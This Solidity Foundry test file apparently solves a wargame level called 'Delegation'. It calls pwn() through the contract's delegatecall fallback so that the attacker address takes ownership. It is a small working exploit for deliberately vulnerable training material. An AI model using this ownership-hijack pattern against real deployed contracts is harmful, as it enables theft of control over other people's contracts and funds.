// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../instances/Ilevel06.sol";

contract Attacker is Test {
    Delegation level06 = Delegation(0x91576DBD1d602Ee24e090A36e5d99dB95682Be4A);
    address attacker = 0xE58EB5D607D62AdDf5F16e3750FB56adD6771917;

    function test() external {
        vm.prank(attacker);
        (bool success,) = address(level06).call(abi.encodeWithSignature("pwn()"));

        assert(success);
        assertEq(level06.owner(), attacker);
    }
}
